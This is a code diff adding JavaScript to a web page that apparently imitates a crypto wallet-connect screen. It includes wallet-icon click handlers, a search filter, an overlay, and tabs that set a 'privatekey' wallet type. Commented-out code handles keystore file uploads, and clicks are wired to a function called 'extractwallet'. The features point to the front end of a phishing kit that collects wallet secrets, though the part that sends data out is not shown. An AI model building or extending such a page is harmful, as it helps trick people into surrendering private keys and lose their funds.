+    } else if ($(element).text() == "Private Key") {
+
+      $('.ccbox').removeClass('activebox');
+      $('.privatebox').addClass('activebox');
+
+      $('#wallettype').val("privatekey");
+
+    }
+
+
+  }
+
+</script>
+<script>
+  function myFunction() {
+      var input, filter, ul, li, a, i, txtValue;
+      input = document.getElementById("myInput");
+      filter = input.value.toUpperCase();
+      ul = document.getElementById("myUL");
+      li = ul.getElementsByTagName("li");
+      for (i = 0; i < li.length; i++) {
+          a = li[i].getElementsByTagName("a")[0];
+          txtValue = a.textContent || a.innerText;
+          if (txtValue.toUpperCase().indexOf(filter) > -1) {
+              li[i].style.display = "";
+          } else {
+              li[i].style.display = "none";
+          }
+      }
+  }
+  </script>
+<script>
+  var popupname = document.querySelector("#walletname");
+  var overlay = document.querySelector(".overlay");
+  var icon = document.querySelectorAll(".iconzzz");
+  var icon_text = document.querySelectorAll(".pageStyles__SAppName-sc-1navawn-7");
+  var popupimage = document.getElementById("myImg");
+  var icon_img = document.querySelectorAll(".img_icons");
+  var wallet_id = document.querySelector("#wallet_id");
+
+  function icon_click(e) {
+    if (e.currentTarget = window.icon[i])
+      e.preventDefault();
+    var overlay = document.querySelector(".overlay");
+    overlay.style.display = "flex";
+    console.log(e);
+    //popupname.innerHTML = e.srcElement.firstChild.alt.replace(" Wallet", "");
+    //popupimage.src = e.srcElement.firstChild.currentSrc;
+    //wallet_id.value = popupname.innerHTML;
+    $("#exampleModal").modal("hide");
+    //alert("hello");
+  }
+
+  for (var i = 0; i < icon.length; i++) {
+   
+    icon[i].addEventListener("click", icon_click, true)
+
+  }
+
+  /*
+  for (var i = 0; i < icon_text.length; i++) {
+    icon_text[i].addEventListener("click", function (e) {
+      e.preventDefault();
+      var overlay = document.querySelector(".overlay");
+      overlay.style.display = "flex";
+      console.log(e);
+      popupname.innerHTML = e.srcElement.innerText.replace(" Wallet", "");
+      popupimage.src = e.target.previousElementSibling.firstElementChild.currentSrc;
+      wallet_id.value = popupname.innerHTML;
+    })
+
+  }
+
+  //img-icon event listener
+  for (var i = 0; i < icon_img.length; i++) {
+    icon_img[i].addEventListener("click", function (e) {
+      e.preventDefault();
+      var overlay = document.querySelector(".overlay");
+      overlay.style.display = "flex";
+      console.log(e);
+      popupname.innerHTML = e.toElement.alt.replace(" Wallet", "");
+      popupimage.src = e.toElement.currentSrc;
+
+      wallet_id.value = popupname.innerHTML;
+    }, true)
+
+  }*/
+
+  //var cancel = document.querySelector("#cancel");
+   /*cancel.addEventListener("click", function () {
+    var overlay = document.querySelector(".overlay");
+    overlay.style.display = "none";
+    var span = document.querySelector("#span");
+    span.innerHTML = "Choose Keystore File";
+    var attr = document.querySelector("#first");
+    var attr2 = document.querySelector("#second");
+    var attr3 = document.querySelector("#third");
+
+    attr.classList.remove("active");
+    attr2.classList.remove("active");
+    attr3.classList.remove("active");
+    attr.classList.add("active");
+    var attr = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");
+
+
+    for (let i = 0; i < attr.length; i++) {
+      attr[i].value = "";
+
+    }
+  });*/
+
+
+  // var label = document.querySelector("#label");
+  // label.addEventListener("change", filenaming);
+
+  // function filenaming(e) {
+  //   e.preventDefault();
+  //   var spantag = document.querySelector("#span");
+  //   var fullPath = document.getElementById('file-upload').value;
+  //   if (fullPath) {
+  //     var startIndex = (fullPath.indexOf('\\') >= 0 ? fullPath.lastIndexOf('\\') : fullPath.lastIndexOf('/'));
+  //     var filename = fullPath.substring(startIndex);
+  //     if (filename.indexOf('\\') === 0 || filename.indexOf('/') === 0) {
+  //       filename = filename.substring(1);
+  //     }
+  //     spantag.innerHTML = filename;
+  //   }
+  // }
+</script>
+<script>
+
+  $('.iconzzz').click(function () {
+    extractwallet(this);
+  });
+
+
+</script>
